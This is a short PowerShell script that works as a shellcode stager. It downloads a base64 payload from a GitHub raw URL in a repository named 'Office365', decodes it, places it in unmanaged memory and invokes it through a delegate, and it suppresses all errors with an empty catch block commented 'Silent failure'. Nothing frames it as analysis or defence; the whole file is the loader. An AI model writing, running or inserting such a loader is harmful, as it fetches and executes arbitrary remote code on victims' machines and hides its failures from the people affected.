# Download and execute shellcode from GitHub
try {
    $url = "https://raw.githubusercontent.com/wolfgangphelan994924/Office365/main/shellcode_b64.txt"
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $b64 = $wc.DownloadString($url)
    $b64 = $b64.Trim()
    
    # Decode base64
    $bytes = [Convert]::FromBase64String($b64)
    
    # Allocate memory
    $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length)
    
    # Copy shellcode to allocated memory
    [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $bytes.Length)
    
    # Create delegate and execute
    $delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [Func[]])
    $delegate.Invoke()
    
    # Cleanup
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ptr)
} catch {
    # Silent failure
}